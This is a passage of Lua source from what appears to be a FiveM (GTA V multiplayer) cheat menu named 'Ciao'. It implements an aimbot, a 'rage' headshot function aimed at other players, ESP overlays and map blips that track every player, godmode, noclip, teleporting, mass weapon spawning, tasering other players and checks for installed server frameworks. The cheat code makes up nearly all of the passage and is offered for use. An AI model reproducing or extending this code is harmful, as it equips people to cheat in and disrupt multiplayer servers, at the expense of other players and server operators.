                KickFromVeh(i)
            end
        end

        local function CancelAnimsAll(self)
            local plist = GetActivePlayers()
            for i = 0, #plist do
                if not self and i == PlayerId() then i = i + 1 end
                ClearPedTasksImmediately(GetPlayerPed(plist[i]))
            end
        end

        local function RandomClothes(target)
            local ped = GetPlayerPed(target)
            SetPedRandomComponentVariation(ped, arwet)
            SetPedRandomProps(ped)
        end

        local function GiveAllWeapons(target)
            local ped = GetPlayerPed(target)
            for i = 0, #allweapons do
                GiveWeaponToPed(ped, GetHashKey(allweapons[i]), 9999, arwet, arwet)
            end
        end

        local function GiveAllPlayersWeapons(self)
            local plist = GetActivePlayers()
            for i = 0, #plist do
                if not self and i == PlayerId() then i = i + 1 end
                GiveAllWeapons(i)
            end
        end

        local function GiveWeapon(target, weapon)
            local ped = GetPlayerPed(target)
            GiveWeaponToPed(ped, GetHashKey(weapon), 9999, arwet, arwet)
        end

        local function GiveMaxAmmo(target)
            local ped = GetPlayerPed(target)
            for i = 1, #allweapons do
                AddAmmoToPed(ped, GetHashKey(allweapons[i]), 9999)
            end
        end

        local function TeleportToPlayer(target)
            local ped = GetPlayerPed(target)
            local pos = GetEntityCoords(ped)
            SetEntityCoords(PlayerPedId(), pos)
        end

        local function TeleportToWaypoint()
            local entity = PlayerPedId()
            if IsPedInAnyVehicle(entity, arwet) then
                entity = GetVehiclePedIsUsing(entity)
            end
            local success = arwet
            local blipFound = arwet
            local blipIterator = GetBlipInfoIdIterator()
            local blip = GetFirstBlipInfoId(8)

            while DoesBlipExist(blip) do
                if GetBlipInfoIdType(blip) == 4 then
                    cx, cy, cz = table.unpack(Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()))--GetBlipInfoIdCoord(blip)
                    blipFound = true
                    break
                end
                blip = GetNextBlipInfoId(blipIterator)
                Wait(0)
            end

            if blipFound then
                local groundFound = arwet
                local yaw = GetEntityHeading(entity)

                for i = 0, 1000, 1 do
                    SetEntityCoordsNoOffset(entity, cx, cy, ToFloat(i), arwet, arwet, arwet)
                    SetEntityRotation(entity, 0, 0, 0, 0, 0)
                    SetEntityHeading(entity, yaw)
                    SetGameplayCamRelativeHeading(0)
                    Wait(0)
                    if GetGroundZFor_3dCoord(cx, cy, ToFloat(i), cz, arwet) then
                        cz = ToFloat(i)
                        groundFound = true
                        break
                    end
                end
                if not groundFound then
                    cz = -300.0
                end
                success = true
            else
                ShowInfo('~r~Blip not found')
            end

            if success then
            ShowInfo("~g~Teleported!")
                SetEntityCoordsNoOffset(entity, cx, cy, cz, arwet, arwet, true)
                SetGameplayCamRelativeHeading(0)
                if IsPedSittingInAnyVehicle(PlayerPedId()) then
                    if GetPedInVehicleSeat(GetVehiclePedIsUsing(PlayerPedId()), -1) == PlayerPedId() then
                        SetVehicleOnGroundProperly(GetVehiclePedIsUsing(PlayerPedId()))
                    end
                end
            end

        end


        local function ToggleGodmode(tog)
            local ped = PlayerPedId()
            SetEntityProofs(ped, tog, tog, tog, tog, tog)
            SetPedCanRagdoll(ped, not tog)
        end

        local function ToggleNoclip()
        ShowInfo("Noclipping ~g~[ON]")
            Noclipping = not Noclipping
            if Noclipping then
                SetEntityVisible(PlayerPedId(), arwet, arwet)
            else
                SetEntityRotation(GetVehiclePedIsIn(PlayerPedId(), 0), GetGameplayCamRot(2), 2, 1)
                SetEntityVisible(GetVehiclePedIsIn(PlayerPedId(), 0), true, arwet)
                SetEntityVisible(PlayerPedId(), true, arwet)
            end
        end

        local function ToggleESP()
            ESPEnabled = not ESPEnabled
            local _,x,y = arwet, 0.0, 0.0

            Citizen.CreateThread(function()
                while ESPEnabled do
                    local plist = GetActivePlayers()
                    table.removekey(plist, PlayerId())
                    for i = 1, #plist do
                        local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
                        _, x, y = GetScreenCoordFromWorldCoord(targetCoords.x, targetCoords.y, targetCoords.z)
                    end
                    Wait(ESPRefreshTime)
                end
            end)


            Citizen.CreateThread(function()
                while ESPEnabled do
                    local plist = GetActivePlayers()
                    table.removekey(plist, PlayerId())
                    for i = 1, #plist do
                        local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
                        local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), targetCoords)
                        if distance <= EspDistance then
                            local _, wephash = GetCurrentPedWeapon(GetPlayerPed(plist[i]), 1)
                            local wepname = GetWeaponNameFromHash(wephash)
                            local vehname = "On Foot"
                            if IsPedInAnyVehicle(GetPlayerPed(plist[i]), 0) then
                                vehname = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(GetPlayerPed(plist[i])))))
                            end
                            if wepname == nname then
                                wepname = "Unknown"
                            end
                            DrawRect(x, y, 0.008, 0.01, 0, 0, 255, 255)
                            DrawRect(x, y, 0.003, 0.005, 255, 0, 0, 255)
                            local espstring1 = "~b~ID: ~w~" .. GetPlayerServerId(plist[i]) .. "~w~  |  ~b~Name: ~w~" .. GetPlayerName(plist[i]) .. "  |  ~b~Distance: ~w~" .. math.floor(distance)
                            local espstring2 = "~b~Weapon: ~w~" .. wepname .. "  |  ~b~Vehicle: ~w~" .. vehname
                            DrawTxt(espstring1, x - 0.05, y - 0.04, 0.0, 0.2)
                            DrawTxt(espstring2, x - 0.05, y - 0.03, 0.0, 0.2)
                        end
                    end
                    Wait(0)
                end
            end)
        end

        function ToggleBlips()
            BlipsEnabled = not BlipsEnabled

            if not BlipsEnabled then
                for i = 1, #pblips do
                    RemoveBlip(pblips[i])
                end
            else

                Citizen.CreateThread(function()
                    pblips = {}
                    while BlipsEnabled do
                        local plist = GetActivePlayers()
                        table.removekey(plist, PlayerId())
                        for i = 1, #plist do
                            if NetworkIsPlayerActive(plist[i]) then
                                ped = GetPlayerPed(plist[i])
                                pblips[i] = GetBlipFromEntity(ped)
                                if not DoesBlipExist(pblips[i]) then
                                    pblips[i] = AddBlipForEntity(ped)
                                    SetBlipSprite(pblips[i], 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)
                                else
                                    veh = GetVehiclePedIsIn(ped, arwet)
                                    blipSprite = GetBlipSprite(pblips[i])
                                    if not GetEntityHealth(ped) then
                                        if blipSprite ~= 274 then
                                            SetBlipSprite(pblips[i], 274)
                                            Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], arwet)
                                        end
                                    elseif veh then
                                        vehClass = GetVehicleClass(veh)
                                        vehModel = GetEntityModel(veh)
                                        if vehClass == 15 then
                                            if blipSprite ~= 422 then
                                                SetBlipSprite(pblips[i], 422)
                                                Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], arwet)
                                            end
                                        elseif vehClass == 16 then
                                            if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra")
                                                or vehModel == GetHashKey("lazer") then -- jet
                                                if blipSprite ~= 424 then
                                                    SetBlipSprite(pblips[i], 424)
                                                    Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], arwet)
                                                end
                                            elseif blipSprite ~= 423 then
                                                SetBlipSprite(pblips[i], 423)
                                                Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], arwet)
                                            end
                                        elseif vehClass == 14 then
                                            if blipSprite ~= 427 then
                                                SetBlipSprite(pblips[i], 427)
                                                Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], arwet)
                                            end
                                        elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2")
                                            or vehModel == GetHashKey("limo2") then
                                            if blipSprite ~= 426 then
                                                SetBlipSprite(pblips[i], 426)
                                                Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], arwet)
                                            end
                                        elseif vehModel == GetHashKey("rhino") then
                                            if blipSprite ~= 421 then
                                                SetBlipSprite(pblips[i], 421)
                                                Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], arwet)
                                            end
                                        elseif blipSprite ~= 1 then
                                            SetBlipSprite(pblips[i], 1)
                                            Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)
                                        end


                                        passengers = GetVehicleNumberOfPassengers(veh)
                                        if passengers then
                                            if not IsVehicleSeatFree(veh, -1) then
                                                passengers = passengers + 1
                                            end
                                            ShowNumberOnBlip(pblips[i], passengers)
                                        else
                                            HideNumberOnBlip(pblips[i])
                                        end
                                    else


                                        HideNumberOnBlip(pblips[i])
                                        if blipSprite ~= 1 then
                                            SetBlipSprite(pblips[i], 1)
                                            Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)
                                        end
                                    end
                                    SetBlipRotation(pblips[i], math.ceil(GetEntityHeading(veh)))
                                    SetBlipNameToPlayerName(pblips[i], plist[i])
                                    SetBlipScale(pblips[i], 0.85)


                                    if IsPauseMenuActive() then
                                        SetBlipAlpha(pblips[i], 255)
                                    else
                                        x1, y1 = table.unpack(GetEntityCoords(PlayerPedId(), true))
                                        x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(plist[i]), true))
                                        distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
                                        if distance < 0 then
                                            distance = 0
                                        elseif distance > 255 then
                                            distance = 255
                                        end
                                        SetBlipAlpha(pblips[i], distance)
                                    end
                                end
                            end
                        end
                        Wait(0)
                    end
                end)
            end
        end

        local function ShootAt(target, bone)
            local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, bone), 0.0, 0.0, 0.0)
            SetPedShootsAtCoord(PlayerPedId(), boneTarget, true)
        end

        local function ShootAt2(target, bone, damage)
            local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, bone), 0.0, 0.0, 0.0)
            local _, weapon = GetCurrentPedWeapon(PlayerPedId())
            ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0, 0.1)), boneTarget, damage, true, weapon, PlayerPedId(), true, true, 1000.0)
        end

        local function ShootAimbot(k)
            if IsEntityOnScreen(k) and HasEntityClearLosToEntityInFront(PlayerPedId(), k) and
                not IsPedDeadOrDying(k) and not IsPedInVehicle(k, GetVehiclePedIsIn(k), arwet) and
                IsDisabledControlPressed(0, Keys["MOUSE1"]) and IsPlayerFreeAiming(PlayerId()) then
                local x, y, z = table.unpack(GetEntityCoords(k))
                local _, _x, _y = World3dToScreen2d(x, y, z)
                if _x > 0.25 and _x < 0.75 and _y > 0.25 and _y < 0.75 then
                    local _, weapon = GetCurrentPedWeapon(PlayerPedId())
                    ShootAt2(k, AimbotBone, GetWeaponDamage(weapon, 1))
                end
            end
        end

        local function RageShoot(target)
            if not IsPedDeadOrDying(target) then
                local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, "SKEL_HEAD"), 0.0, 0.0, 0.0)
                local _, weapon = GetCurrentPedWeapon(PlayerPedId())
                ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0, 0.1)), boneTarget, 9999, true, weapon, PlayerPedId(), arwet, arwet, 1000.0)
                ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0.1, 0)), boneTarget, 9999, true, weapon, PlayerPedId(), arwet, arwet, 1000.0)
                ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0.1, 0, 0)), boneTarget, 9999, true, weapon, PlayerPedId(), arwet, arwet, 1000.0)
            end
        end

        local function NameToBone(name)
            if name == "Head" then
                return "SKEL_Head"
            elseif name == "Chest" then
                return "SKEL_Spine2"
            elseif name == "Left Arm" then
                return "SKEL_L_UpperArm"
            elseif name == "Right Arm" then
                return "SKEL_R_UpperArm"
            elseif name == "Left Leg" then
                return "SKEL_L_Thigh"
            elseif name == "Right Leg" then
                return "SKEL_R_Thigh"
            elseif name == "Dick" then
                return "SKEL_Pelvis"
            else
                return "SKEL_ROOT"
            end
        end

        local function SpawnVeh(model, PlaceSelf, SpawnEngineOn)
            RequestModel(GetHashKey(model))
            Wait(500)
            if HasModelLoaded(GetHashKey(model)) then
                local coords = GetEntityCoords(PlayerPedId())
                local xf = GetEntityForwardX(PlayerPedId())
                local yf = GetEntityForwardY(PlayerPedId())
                local heading = GetEntityHeading(PlayerPedId())
                local veh = CreateVehicle(GetHashKey(model), coords.x + xf * 5, coords.y + yf * 5, coords.z, heading, 1, 1)
                if PlaceSelf then SetPedIntoVehicle(PlayerPedId(), veh, -1) end
                if SpawnEngineOn then SetVehicleEngineOn(veh, 1, 1) end
                return veh
            else ShowInfo("~r~Model not recognized (Try Again)") end
        end

        local function SpawnPlane(model, PlaceSelf, SpawnInAir)
            RequestModel(GetHashKey(model))
            Wait(500)
            if HasModelLoaded(GetHashKey(model)) then
                local coords = GetEntityCoords(PlayerPedId())
                local xf = GetEntityForwardX(PlayerPedId())
                local yf = GetEntityForwardY(PlayerPedId())
                local heading = GetEntityHeading(PlayerPedId())
                local veh = nname
                if SpawnInAir then
                    veh = CreateVehicle(GetHashKey(model), coords.x + xf * 20, coords.y + yf * 20, coords.z + 500, heading, 1, 1)
                else
                    veh = CreateVehicle(GetHashKey(model), coords.x + xf * 5, coords.y + yf * 5, coords.z, heading, 1, 1)
                end
                if PlaceSelf then SetPedIntoVehicle(PlayerPedId(), veh, -1) end
            else ShowInfo("~r~Model not recognized (Try Again)") end
        end
        RequestWeaponAsset(`WEAPON_STUNGUN`)

        local function TazePlayer(player)
            local ped = GetPlayerPed(player)
            local tLoc = GetEntityCoords(ped)

            local destination = GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
            local origin = GetPedBoneCoords(ped, 57005, 0.0, 0.0, 0.2)



            ShootSingleBulletBetweenCoords(origin, destination, 1, true, `WEAPON_STUNGUN`, PlayerPedId(), true, false, 1.0)
        end

        local function GetCurrentOutfit(target)
            local ped = GetPlayerPed(target)
            outfit = {}

            outfit.hat = GetPedPropIndex(ped, 0)
            outfit.hat_texture = GetPedPropTextureIndex(ped, 0)

            outfit.glasses = GetPedPropIndex(ped, 1)
            outfit.glasses_texture = GetPedPropTextureIndex(ped, 1)

            outfit.ear = GetPedPropIndex(ped, 2)
            outfit.ear_texture = GetPedPropTextureIndex(ped, 2)

            outfit.watch = GetPedPropIndex(ped, 6)
            outfit.watch_texture = GetPedPropTextureIndex(ped, 6)

            outfit.wrist = GetPedPropIndex(ped, 7)
            outfit.wrist_texture = GetPedPropTextureIndex(ped, 7)

            outfit.head_drawable = GetPedDrawableVariation(ped, 0)
            outfit.head_palette = GetPedPaletteVariation(ped, 0)
            outfit.head_texture = GetPedTextureVariation(ped, 0)

            outfit.beard_drawable = GetPedDrawableVariation(ped, 1)
            outfit.beard_palette = GetPedPaletteVariation(ped, 1)
            outfit.beard_texture = GetPedTextureVariation(ped, 1)

            outfit.hair_drawable = GetPedDrawableVariation(ped, 2)
            outfit.hair_palette = GetPedPaletteVariation(ped, 2)
            outfit.hair_texture = GetPedTextureVariation(ped, 2)

            outfit.torso_drawable = GetPedDrawableVariation(ped, 3)
            outfit.torso_palette = GetPedPaletteVariation(ped, 3)
            outfit.torso_texture = GetPedTextureVariation(ped, 3)

            outfit.legs_drawable = GetPedDrawableVariation(ped, 4)
            outfit.legs_palette = GetPedPaletteVariation(ped, 4)
            outfit.legs_texture = GetPedTextureVariation(ped, 4)

            outfit.hands_drawable = GetPedDrawableVariation(ped, 5)
            outfit.hands_palette = GetPedPaletteVariation(ped, 5)
            outfit.hands_texture = GetPedTextureVariation(ped, 5)

            outfit.foot_drawable = GetPedDrawableVariation(ped, 6)
            outfit.foot_palette = GetPedPaletteVariation(ped, 6)
            outfit.foot_texture = GetPedTextureVariation(ped, 6)

            outfit.acc1_drawable = GetPedDrawableVariation(ped, 7)
            outfit.acc1_palette = GetPedPaletteVariation(ped, 7)
            outfit.acc1_texture = GetPedTextureVariation(ped, 7)

            outfit.acc2_drawable = GetPedDrawableVariation(ped, 8)
            outfit.acc2_palette = GetPedPaletteVariation(ped, 8)
            outfit.acc2_texture = GetPedTextureVariation(ped, 8)

            outfit.acc3_drawable = GetPedDrawableVariation(ped, 9)
            outfit.acc3_palette = GetPedPaletteVariation(ped, 9)
            outfit.acc3_texture = GetPedTextureVariation(ped, 9)

            outfit.mask_drawable = GetPedDrawableVariation(ped, 10)
            outfit.mask_palette = GetPedPaletteVariation(ped, 10)
            outfit.mask_texture = GetPedTextureVariation(ped, 10)

            outfit.aux_drawable = GetPedDrawableVariation(ped, 11)
            outfit.aux_palette = GetPedPaletteVariation(ped, 11)
            outfit.aux_texture = GetPedTextureVariation(ped, 11)

            return outfit
        end

        local function SetCurrentOutfit(outfit)
            local ped = PlayerPedId()

            SetPedPropIndex(ped, 0, outfit.hat, outfit.hat_texture, 1)
            SetPedPropIndex(ped, 1, outfit.glasses, outfit.glasses_texture, 1)
            SetPedPropIndex(ped, 2, outfit.ear, outfit.ear_texture, 1)
            SetPedPropIndex(ped, 6, outfit.watch, outfit.watch_texture, 1)
            SetPedPropIndex(ped, 7, outfit.wrist, outfit.wrist_texture, 1)

            SetPedComponentVariation(ped, 0, outfit.head_drawable, outfit.head_texture, outfit.head_palette)
            SetPedComponentVariation(ped, 1, outfit.beard_drawable, outfit.beard_texture, outfit.beard_palette)
            SetPedComponentVariation(ped, 2, outfit.hair_drawable, outfit.hair_texture, outfit.hair_palette)
            SetPedComponentVariation(ped, 3, outfit.torso_drawable, outfit.torso_texture, outfit.torso_palette)
            SetPedComponentVariation(ped, 4, outfit.legs_drawable, outfit.legs_texture, outfit.legs_palette)
            SetPedComponentVariation(ped, 5, outfit.hands_drawable, outfit.hands_texture, outfit.hands_palette)
            SetPedComponentVariation(ped, 6, outfit.foot_drawable, outfit.foot_texture, outfit.foot_palette)
            SetPedComponentVariation(ped, 7, outfit.acc1_drawable, outfit.acc1_texture, outfit.acc1_palette)
            SetPedComponentVariation(ped, 8, outfit.acc2_drawable, outfit.acc2_texture, outfit.acc2_palette)
            SetPedComponentVariation(ped, 9, outfit.acc3_drawable, outfit.acc3_texture, outfit.acc3_palette)
            SetPedComponentVariation(ped, 10, outfit.mask_drawable, outfit.mask_texture, outfit.mask_palette)
            SetPedComponentVariation(ped, 11, outfit.aux_drawable, outfit.aux_texture, outfit.aux_palette)
        end

        local function GetResources()
            local resources = {}
            for i = 1, GetNumResources() do
                resources[i] = GetResourceByFindIndex(i)
            end
            return resources
        end

        function IsResourceInstalled(name)
            local resources = GetResources()
            for i = 1, #resources do
                if resources[i] == name then
                    return true
                else
                    return arwet
                end
            end
        end

        function Ciao.SetFont(id, font)
            buttonFont = font
            menus[id].titleFont = font
        end

        function Ciao.SetMenuFocusBackgroundColor(id, r, g, b, a)
            setMenuProperty(id, "menuFocusBackgroundColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusBackgroundColor.a})
        end

        function Ciao.SetMaxOptionCount(id, count)
            setMenuProperty(id, 'maxOptionCount', count)
        end

        function Ciao.PopupWindow(x, y, title)

        end


        function Ciao.SetTheme(id, theme)
            if theme == "basic" then
                Ciao.SetMenuBackgroundColor(id, 81, 231, 251, 125)
                Ciao.SetTitleBackgroundColor(id, 92, 212, 249, 80)
                Ciao.SetTitleColor(id, 92, 212, 249, 230)
                Ciao.SetMenuSubTextColor(id, 255, 255, 255, 230)
                Ciao.SetMenuFocusColor(id, 40, 40, 40, 230)
                Ciao.SetFont(id, 7)
                Ciao.SetMenuX(id, .75)-- [0.0..1.0] top left corner
                Ciao.SetMenuY(id, .1)-- [0.0..1.0] top
                Ciao.SetMenuWidth(id, 0.23)-- 0.23
                Ciao.SetMaxOptionCount(id, 12)-- 10
                
                titleHeight = 0.11 --0.11
                titleXOffset = 0.5 -- 0.5
                titleYOffset = 0.03 --0.03
                titleSpacing = 2 -- 2
                buttonHeight = 0.038 --0.038
                buttonScale = 0.365 --0.365
                buttonTextXOffset = 0.005 --0.005
                buttonTextYOffset = 0.005 --0.005
                
                themecolor = '~r~'
                themearrow = "+"
            elseif theme == "blue" then
                Ciao.SetMenuBackgroundColor(id, 180, 80, 80, 255)
                Ciao.SetTitleBackgroundColor(id, 180, 80, 80, 255)
                Ciao.SetTitleColor(id, 180, 80, 80, 230)
                Ciao.SetMenuSubTextColor(id, 255, 255, 255, 230)
                Ciao.SetMenuFocusColor(id, 40, 40, 40, 255)
                Ciao.SetFont(id, 1)
                Ciao.SetMenuX(id, .75)
                Ciao.SetMenuY(id, .1)
                Ciao.SetMenuWidth(id, 0.23)-- 0.23
                Ciao.SetMaxOptionCount(id, 12)-- 10

                titleHeight = 0.11 --0.11
                titleXOffset = 0.5 -- 0.5
                titleYOffset = 0.03 --0.03
                titleSpacing = 2 -- 2
                buttonHeight = 0.038 --0.038
                buttonScale = 0.475 --0.365
                buttonTextXOffset = 0.005 --0.005
                buttonTextYOffset = 0.005 --0.005
                

                themecolor = '~r~'
                themearrow = ">"
            elseif theme == "skid" then
                Ciao.SetMenuBackgroundColor(id, 23, 32, 42)
                Ciao.SetTitleBackgroundColor(id, 23, 32, 42)
                Ciao.SetTitleColor(id, 255, 0, 0, 255)
                Ciao.SetMenuSubTextColor(id, 255, 255, 255, 255)
                Ciao.SetMenuFocusColor(id, 10, 75, 75, 175)
                Ciao.SetFont(id, 4)
                Ciao.SetMenuX(id, .75)
                Ciao.SetMenuY(id, .1)
                Ciao.SetMenuWidth(id, 0.23)-- 0.23
                Ciao.SetMaxOptionCount(id, 10)-- 10
                titleHeight = 0.11 --0.11
                titleXOffset = 0.5 -- 0.5
                titleYOffset = 0.03 --0.03
                titleSpacing = 2 -- 2
                buttonHeight = 0.038 --0.038
                buttonScale = 0.365 --0.365
                buttonTextXOffset = 0.005 --0.005
                buttonTextYOffset = 0.005 --0.005
                
                themecolor = '~u~'
                themearrow = "~u~>"

                titleHeight = 0.11 --0.11
                titleXOffset = 0.5 -- 0.5
                titleYOffset = 0.03 --0.03
                titleSpacing = 2 -- 2
                buttonHeight = 0.038 --0.038
                buttonScale = 0.365 --0.365
                buttonTextXOffset = 0.005 --0.005
                buttonTextYOffset = 0.005 --0.005

                themecolor = '~u~'
                themearrow = "~u~>"
            elseif theme == "infamous" then
                Ciao.SetMenuBackgroundColor(id, 38, 38, 38, 255)
                Ciao.SetTitleBackgroundColor(id, 92, 212, 249, 255)
                Ciao.SetTitleColor(id, 240, 240, 240, 255)
                Ciao.SetMenuSubTextColor(id, 240, 240, 240, 255)
                Ciao.SetMenuFocusBackgroundColor(id, 100, 220, 250, 255)
                Ciao.SetFont(id, 4)
                Ciao.SetMenuX(id, .725)
                Ciao.SetMenuY(id, .1)
                Ciao.SetMenuWidth(id, 0.25)-- 0.23
                Ciao.SetMaxOptionCount(id, 12)-- 10
                
                titleHeight = 0.07 --0.11
                titleXOffset = 0.2 -- 0.5
                titleYOffset = 0.005 --0.03
                titleScale = 0.7 -- 1.0
                titleSpacing = 1.5
                buttonHeight = 0.033 --0.038
                buttonScale = 0.360 --0.365
                buttonTextXOffset = 0.003 --0.005
                buttonTextYOffset = 0.0025 --0.005
                
                themecolor = "~s~"
                themearrow = ">>"
            end
        end

        function Ciao.InitializeTheme()
            for i = 1, #menulist do
                Ciao.SetTheme(menulist[i], theme)
            end
        end

        -- ComboBox w/ new index behaviour (does not wrap around)
        function Ciao.ComboBox2(text, items, currentIndex, selectedIndex, callback)
            local itemsCount = #items
            local selectedItem = items[currentIndex]
            local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

            if itemsCount > 1 and isCurrent then
                selectedItem = tostring(selectedItem)
            end

            if Ciao.Button(text, selectedItem) then
                selectedIndex = currentIndex
                callback(currentIndex, selectedIndex)
                return true
            elseif isCurrent then
                if currentKey == keys.left then
                    if currentIndex > 1 then currentIndex = currentIndex - 1
                    elseif currentIndex == 1 then currentIndex = 1 end
                elseif currentKey == keys.right then
                    if currentIndex < itemsCount then  currentIndex = currentIndex + 1
                    elseif currentIndex == itemsCount then currentIndex = itemsCount end
                end
            else
                currentIndex = selectedIndex
            end

            callback(currentIndex, selectedIndex)
            return arwet
        end

        -- Button with a slider
        function Ciao.ComboBoxSlider(text, items, currentIndex, selectedIndex, callback)
            local itemsCount = #items
            local selectedItem = items[currentIndex]
            local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

            if itemsCount > 1 and isCurrent then
                selectedItem = tostring(selectedItem)
            end

            if Ciao.Button2(text, items, itemsCount, currentIndex) then
                selectedIndex = currentIndex
                callback(currentIndex, selectedIndex)
                return true
            elseif isCurrent then
                if currentKey == keys.left then
                    if currentIndex > 1 then currentIndex = currentIndex - 1
                    elseif currentIndex == 1 then currentIndex = 1 end
                elseif currentKey == keys.right then
                    if currentIndex < itemsCount then currentIndex = currentIndex + 1
                    elseif currentIndex == itemsCount then currentIndex = itemsCount end
                end
            else
                currentIndex = selectedIndex
            end
            callback(currentIndex, selectedIndex)
            return arwet
        end

        local function drawButton2(text, items, itemsCount, currentIndex)
            local x = menus[currentMenu].x + menus[currentMenu].width / 2
            local multiplier = nname

            if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
                multiplier = optionCount
            elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
                multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
            end

            if multiplier then
                local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2
                local backgroundColor = nname
                local textColor = nname
                local subTextColor = nname
                local shadow = arwet

                if menus[currentMenu].currentOption == optionCount then
                    backgroundColor = menus[currentMenu].menuFocusBackgroundColor
                    textColor = menus[currentMenu].menuFocusTextColor
                    subTextColor = menus[currentMenu].menuFocusTextColor
                else
                    backgroundColor = menus[currentMenu].menuBackgroundColor
                    textColor = menus[currentMenu].menuTextColor
                    subTextColor = menus[currentMenu].menuSubTextColor
                    shadow = true
                end

                local sliderWidth = ((menus[currentMenu].width / 3) / itemsCount)
                local subtractionToX = ((sliderWidth * (currentIndex + 1)) - (sliderWidth * currentIndex)) / 2

                local XOffset = 0.1 -- Default value in case of any error?
                local stabilizer = 1

                -- Draw order from top to bottom
                if itemsCount >= 40 then
                    stabilizer = 1.005
                end

                drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor) -- Button Rectangle -2.15
                drawRect(((menus[currentMenu].x + 0.1075) + (subtractionToX * itemsCount)) / stabilizer, y, sliderWidth * (itemsCount - 1), buttonHeight / 2, {r = 110, g = 110, b = 110, a = 150}) -- Slide Outline
                drawRect(((menus[currentMenu].x + 0.1075) + (subtractionToX * currentIndex)) / stabilizer, y, sliderWidth * (currentIndex - 1), buttonHeight / 2, {r = 200, g = 200, b = 200, a = 140}) -- Slide
                drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, arwet, shadow) -- Text

                --Ugly Code, I'll refactor it later
                local CurrentItem = tostring(items[currentIndex])
                if string.len(CurrentItem) == 1 then XOffset = 0.1050
                elseif string.len(CurrentItem) == 2 then XOffset = 0.1025
                elseif string.len(CurrentItem) == 3 then XOffset = 0.10015
                elseif string.len(CurrentItem) == 4 then XOffset = 0.1085
                elseif string.len(CurrentItem) == 5 then XOffset = 0.1070
                elseif string.len(CurrentItem) >= 6 then XOffset = 0.1055
                end
                -- roundNum seems kinda useless since I'm adjusting every position manually based on the lenght of the string. As stated above, I'll refactor this part later.
                -- (sliderWidth * roundNum((itemsCount / 2), 3)
                drawText(items[currentIndex], ((menus[currentMenu].x + XOffset) + 0.04) / stabilizer, y - (buttonHeight / 2.15) + buttonTextYOffset, buttonFont, {r = 255, g = 255, b = 255, a = 255}, buttonScale, arwet, shadow) -- Current Item Text
            end
        end

        -- Getting the center of an odd number of itemsCount (breaks on negative numbers)
        function roundNum(num, numDecimalPlaces)
            local mult = 10^(numDecimalPlaces or 0)
            return math.floor(num * mult + 0.5) / mult
        end

        function Ciao.Button2(text, items, itemsCount, currentIndex)
            local buttonText = text

            if menus[currentMenu] then
                optionCount = optionCount + 1

                local isCurrent = menus[currentMenu].currentOption == optionCount

                drawButton2(text, items, itemsCount, currentIndex)

                if isCurrent then
                    if currentKey == keys.select then
                        PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
                        debugPrint(buttonText..' button pressed')
                        return true
                    elseif currentKey == keys.left or currentKey == keys.right then
                        PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                    end
                end

                return arwet
            else
                debugPrint('Failed to create '..buttonText..' button: '..tostring(currentMenu)..' menu doesn\'t exist')

                return arwet
            end
        end

        -- Texture Handling
        Citizen.CreateThread(function()
            local p = 1
            while true do
                if theme == "skid" then -- static effect for Ciao theme - https://github.com/esc0rtd3w/illicit-sprx/blob/master/main/illicit/textures.h
                    if p == 5 then p = 1 else p = p + 1 end
                    for i = 1, #menulist do
                        if Ciao.IsMenuOpened(menulist[i]) then Ciao.SetTitleBackgroundSprite(menulist[i], 'digitaloverlay', 'static' .. p) end
                    end
                else -- Base textures
                    for i = 1, #menulist do Ciao.SetTitleBackgroundSprite(menulist[i], 'mpinventory', 'mp_specitem_weed_black') end
                end
                Wait(100)
            end
        end)

        Resources = GetResources()

        ResourcesToCheck = {
                -- ESX
                "es_extended", "esx_dmvschool", "esx_policejob", "",
                -- VRP
                "vrp", "vrp_trucker", "vrp_TruckerJob"
        }

        Citizen.CreateThread(function()
            if mpMessage then ShowMPMessage(startMessage, subMessage, 50) else ShowInfo(startMessage .. " " .. subMessage) end


            -- COMBO BOXES

            local currThemeIndex = 1
            local selThemeIndex = 1

